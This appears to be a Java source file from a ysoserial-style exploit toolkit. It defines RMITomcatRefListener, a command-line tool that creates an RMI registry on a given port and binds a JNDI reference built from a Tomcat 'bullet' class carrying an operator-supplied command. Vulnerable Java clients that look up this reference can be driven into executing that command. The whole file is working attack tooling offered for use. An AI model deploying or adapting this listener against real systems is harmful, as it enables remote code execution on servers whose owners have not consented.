package ysoserial.exploit.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import ysoserial.exploit.ldap.LDAPTomcatRefListener;
import ysoserial.bullet.jndi.TomcatRef;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMITomcatRefListener {
    private String lhost = null;
    private int lport = 0;
    private String objectName = null;
    private Registry registry = null;

    public RMITomcatRefListener(int lport, String objectName, TomcatRef ref, String command) throws Exception {
        this(null, lport, objectName, ref, command);
    }

    public RMITomcatRefListener(String lhost, int lport, String objectName, TomcatRef ref, String command) throws Exception {
        System.setProperty("sun.rmi.transport.tcp.logLevel","VERBOSE");
        if (lhost != null) {
            System.setProperty("java.rmi.server.hostname", lhost);
        }

        this.lhost = lhost;
        this.lport = lport;
        this.objectName = objectName;
        this.registry = LocateRegistry.createRegistry(lport);

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref.getObject(command));
        registry.rebind(objectName, referenceWrapper);
    }

    public static void main(String[] args) {
        if ( args.length < 3 ) {
            System.err.println(RMITomcatRefListener.class.getName() + "[<lhost>] <lport> <ref_type> <payload_arg>");
            System.exit(-1);
            return;
        }

        try {
            if (args.length == 4) {
                args = new String[]{args[1], args[2], args[3], args[0]};
            } else if (args.length == 3) {
                args = new String[]{args[0], args[1], args[2], null};
            }

            int port = Integer.parseInt(args[0]);
            String refClassName = "ysoserial.bullet.jndi." + args[1];
            TomcatRef ref = Class.forName(refClassName).asSubclass(TomcatRef.class).newInstance();
            new RMITomcatRefListener(args[3], port, "TomcatRef", ref, args[2]);
        } catch ( Exception e ) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }
}
